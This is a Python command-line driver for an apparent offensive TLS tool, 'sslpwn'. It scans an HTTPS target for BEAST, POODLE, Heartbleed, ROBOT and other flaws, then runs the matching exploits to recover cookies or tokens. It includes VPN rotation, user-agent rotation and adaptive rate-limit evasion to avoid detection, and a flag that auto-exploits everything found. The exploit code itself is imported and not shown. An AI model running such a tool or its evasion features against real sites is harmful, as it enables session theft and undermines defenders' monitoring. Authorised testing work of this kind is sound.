"""Command‑line interface for sslpwn; scan and exploit mode."""
import argparse
import sys
from typing import Optional, List, Dict, Any

from sslpwn import __version__
from sslpwn.output import OutputManager, console
from sslpwn.banners import show_banner
from sslpwn.vpn import MullvadVPN
from sslpwn.user_agents import UserAgentRotator
from sslpwn.rate_limiter import RateLimiter
from sslpwn.adaptive import AdaptiveManager
from sslpwn.utils import validate_target_url, safe_filename
from sslpwn.report_writer import ReportWriter
from sslpwn.attacks import (
    BeastAttack, Lucky13Attack, BreachAttack, PoodleAttack,
    CrimeAttack, HeartbleedAttack, TicketbleedAttack, RobotAttack,
)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Test for SSL/TLS vulnerabilities; scan all or exploit a single module.",
        epilog="Use responsibly and only on systems you own or are authorised to test.",
    )
    parser.add_argument("target", help="Target HTTPS URL, e.g. https://example.com")
    parser.add_argument("--scan", action="store_true",
                        help="Scan for all vulnerabilities, report findings, then optionally exploit.")
    parser.add_argument("--module", choices=["beast", "lucky13", "breach", "poodle", "crime", "heartbleed", "ticketbleed", "robot"],
                        help="Exploit a single module (ignored if --scan is set).")
    parser.add_argument("--cookie-name", help="Cookie name to decrypt (required for cookie‑based modules).")
    parser.add_argument("--cookie-value", help="Known test cookie value for verification (required for cookie‑based modules).")
    parser.add_argument("--token-parameter", help="GET parameter that reflects the token (BREACH/CRIME).")
    parser.add_argument("--mask-length", type=int, default=10, help="Mask length for BREACH/CRIME (default 10).")
    parser.add_argument("--user-agent-file", help="File with custom User‑Agent strings.")
    parser.add_argument("--rate", type=float, default=2.0, help="Requests per second (default 2.0).")
    parser.add_argument("--output-dir", default=".", help="Directory for output files.")
    parser.add_argument("--no-vpn", action="store_true", help="Disable Mullvad VPN rotation.")
    parser.add_argument("--adaptive", action="store_true", help="Enable adaptive rate‑limiting evasion.")
    parser.add_argument("--adaptive-threshold", type=int, default=3, help="Consecutive errors before evasion.")
    parser.add_argument("--adaptive-backoff-base", type=float, default=1.0, help="Initial backoff time.")
    parser.add_argument("--adaptive-max-backoff", type=float, default=60.0, help="Maximum backoff time.")
    parser.add_argument("--yes", "-y", action="store_true",
                        help="Automatically answer yes to all prompts (exploit all found vulnerabilities).")
    parser.add_argument("--version", action="version", version=f"sslpwn {__version__}")

    args = parser.parse_args()

    try:
        target = validate_target_url(args.target)
    except ValueError as exc:
        console.print(f"[bold red]Invalid target: {exc}[/bold red]")
        sys.exit(1)

    show_banner(console)

    safe_host = safe_filename(target.split("://")[1].split("/")[0])
    output = OutputManager(safe_host, args.output_dir)

    vpn = None
    if not args.no_vpn:
        try:
            vpn = MullvadVPN()
        except EnvironmentError as exc:
            console.print(f"[yellow]VPN disabled: {exc}[/yellow]")
    else:
        console.print("[yellow]VPN rotation disabled by user.[/yellow]")

    ua = UserAgentRotator(args.user_agent_file)
    limiter = RateLimiter(rate=args.rate)

    adaptive = None
    if args.adaptive:
        adaptive = AdaptiveManager(
            rate_limiter=limiter,
            user_agents=ua,
            vpn=vpn,
            base_backoff=args.adaptive_backoff_base,
            max_backoff=args.adaptive_max_backoff,
            error_threshold=args.adaptive_threshold,
        )

    # scan mode; check all vulnerabilities
    if args.scan:
        scan_and_handle(target, output, vpn, ua, limiter, adaptive, args)
    else:
        # single exploit mode
        if not args.module:
            console.print("[bold red]Either --scan or --module must be specified.[/bold red]")
            sys.exit(1)
        run_single_exploit(args, target, output, vpn, ua, limiter, adaptive)

    output.finalise()


def scan_and_handle(target, output, vpn, ua, limiter, adaptive, args):
    """Run all vulnerability checks, report, and prompt for exploitation."""
    output.log(f"Starting vulnerability scan on {target}", "INFO")

    modules = {
        "BEAST": BeastAttack(target, output, vpn, ua, limiter, "", "", adaptive),
        "Lucky13": Lucky13Attack(target, output, vpn, ua, limiter, "", "", adaptive),
        "POODLE": PoodleAttack(target, output, vpn, ua, limiter, "", "", adaptive),
        "CRIME": CrimeAttack(target, output, vpn, ua, limiter, "", 10, adaptive),
        "BREACH": BreachAttack(target, output, vpn, ua, limiter, "", 10, adaptive),
        "Heartbleed": HeartbleedAttack(target, output, vpn, ua, limiter, "", "", adaptive),
        "Ticketbleed": TicketbleedAttack(target, output, vpn, ua, limiter, "", "", adaptive),
        "ROBOT": RobotAttack(target, output, vpn, ua, limiter, "", "", adaptive),
    }

    findings = []
    vulnerable_modules = []

    for name, attack in modules.items():
        console.print(f"\n[bold]Checking {name}...[/bold]")
        output.log(f"Checking {name}...", "INFO")
        try:
            is_vuln = attack.check_vulnerability()
            status = "VULNERABLE" if is_vuln else "NOT VULNERABLE"
            console.print(f"  {name}: {status}")
            findings.append({"name": name, "vulnerable": is_vuln})
            if is_vuln:
                vulnerable_modules.append(name)
        except Exception as e:
            console.print(f"  {name}: ERROR - {e}")
            output.log(f"Check {name} failed: {e}", "ERROR")
            findings.append({"name": name, "vulnerable": False, "error": str(e)})

    # Write initial report (scan results)
    report_writer = ReportWriter(safe_filename(target.split("://")[1].split("/")[0]), "reports")
    report_writer.write_reports(findings)
    output.log(f"Scan reports saved in reports/{safe_filename(target.split('://')[1].split('/')[0])}/", "INFO")

    if not vulnerable_modules:
        console.print("\n[bold]No vulnerabilities detected.[/bold]")
        return

    console.print(f"\n[bold]Vulnerabilities found: {', '.join(vulnerable_modules)}[/bold]")

    # Determine whether to exploit
    if args.yes:
        choice = 'y'
    else:
        choice = console.input("[bold]Do you want to exploit the vulnerable modules? (y/n): [/bold]").strip().lower()

    if choice != 'y':
        console.print("Skipping exploitation.")
        return

    # Gather required credentials if not provided
    if not args.cookie_name or not args.cookie_value:
        if any(m in vulnerable_modules for m in ("BEAST", "Lucky13", "POODLE", "Heartbleed", "Ticketbleed", "ROBOT")):
            console.print("[yellow]Cookie‑based modules require --cookie‑name and --cookie‑value.[/yellow]")
            args.cookie_name = console.input("Cookie name: ").strip()
            args.cookie_value = console.input("Cookie value: ").strip()
    if not args.token_parameter and any(m in vulnerable_modules for m in ("BREACH", "CRIME")):
        console.print("[yellow]BREACH/CRIME require --token‑parameter.[/yellow]")
        args.token_parameter = console.input("Token parameter: ").strip()

    # Run exploits for each vulnerable module (with user interaction)
    for name in vulnerable_modules:
        console.print(f"\n[bold]Exploiting {name}...[/bold]")
        output.log(f"Starting exploit for {name}", "INFO")
        success = False
        details = ""
        try:
            if name == "BEAST":
                attack = BeastAttack(target, output, vpn, ua, limiter,
                                     args.cookie_name, args.cookie_value, adaptive)
            elif name == "Lucky13":
                attack = Lucky13Attack(target, output, vpn, ua, limiter,
                                       args.cookie_name, args.cookie_value, adaptive)
            elif name == "POODLE":
                attack = PoodleAttack(target, output, vpn, ua, limiter,
                                      args.cookie_name, args.cookie_value, adaptive)
            elif name == "CRIME":
                attack = CrimeAttack(target, output, vpn, ua, limiter,
                                     args.token_parameter, args.mask_length, adaptive)
            elif name == "BREACH":
                attack = BreachAttack(target, output, vpn, ua, limiter,
                                      args.token_parameter, args.mask_length, adaptive)
            elif name == "Heartbleed":
                attack = HeartbleedAttack(target, output, vpn, ua, limiter,
                                          args.cookie_name, args.cookie_value, adaptive)
            elif name == "Ticketbleed":
                attack = TicketbleedAttack(target, output, vpn, ua, limiter,
                                           args.cookie_name, args.cookie_value, adaptive)
            elif name == "ROBOT":
                attack = RobotAttack(target, output, vpn, ua, limiter,
                                     args.cookie_name, args.cookie_value, adaptive)
            else:
                continue

            success = attack.exploit()
            if success:
                console.print(f"  [green]{name} exploit successful![/green]")
                details = "Exploit succeeded"
            else:
                console.print(f"  [yellow]{name} exploit failed.[/yellow]")
                details = "Exploit failed"
        except Exception as e:
            console.print(f"  [red]{name} exploit error: {e}[/red]")
            output.log(f"Exploit {name} failed: {e}", "ERROR")
            details = str(e)

        # Update findings with exploit result
        for f in findings:
            if f['name'] == name:
                f['exploit_success'] = success
                f['details'] = details

    # Write final report with exploit results
    report_writer.write_reports(findings)
    output.log("Final reports updated.", "INFO")


def run_single_exploit(args, target, output, vpn, ua, limiter, adaptive):
    """Run the specified module's exploit directly."""
    # Ensure required parameters are present
    if args.module in ("beast", "lucky13", "poodle", "heartbleed", "ticketbleed", "robot"):
        if not args.cookie_name or not args.cookie_value:
            console.print("[bold red]This module requires --cookie-name and --cookie-value.[/bold red]")
            sys.exit(1)
    if args.module in ("breach", "crime"):
        if not args.token_parameter:
            console.print("[bold red]This module requires --token-parameter.[/bold red]")
            sys.exit(1)

    if args.module == "beast":
        attack = BeastAttack(target, output, vpn, ua, limiter,
                             args.cookie_name, args.cookie_value, adaptive)
    elif args.module == "lucky13":
        attack = Lucky13Attack(target, output, vpn, ua, limiter,
                               args.cookie_name, args.cookie_value, adaptive)
    elif args.module == "breach":
        attack = BreachAttack(target, output, vpn, ua, limiter,
                              args.token_parameter, args.mask_length, adaptive)
    elif args.module == "poodle":
        attack = PoodleAttack(target, output, vpn, ua, limiter,
                              args.cookie_name, args.cookie_value, adaptive)
    elif args.module == "crime":
        attack = CrimeAttack(target, output, vpn, ua, limiter,
                             args.token_parameter, args.mask_length, adaptive)
    elif args.module == "heartbleed":
        attack = HeartbleedAttack(target, output, vpn, ua, limiter,
                                  args.cookie_name, args.cookie_value, adaptive)
    elif args.module == "ticketbleed":
        attack = TicketbleedAttack(target, output, vpn, ua, limiter,
                                   args.cookie_name, args.cookie_value, adaptive)
    elif args.module == "robot":
        attack = RobotAttack(target, output, vpn, ua, limiter,
                             args.cookie_name, args.cookie_value, adaptive)
    else:
        console.print("[bold red]Unknown module[/bold red]")
        sys.exit(1)

    success = attack.exploit()
    if success:
        output.log("Exploit succeeded.", "SUCCESS")
    else:
        output.log("Exploit failed.", "WARN")

    # Write a minimal report for this single exploit
    findings = [{
        "name": args.module,
        "vulnerable": True,  # we assume vulnerability because we are exploiting
        "exploit_success": success,
        "details": "Exploit completed" if success else "Exploit did not succeed"
    }]
    report_writer = ReportWriter(safe_filename(target.split("://")[1].split("/")[0]), "reports")
    report_writer.write_reports(findings)
    output.log(f"Report saved in reports/{safe_filename(target.split('://')[1].split('/')[0])}/", "INFO")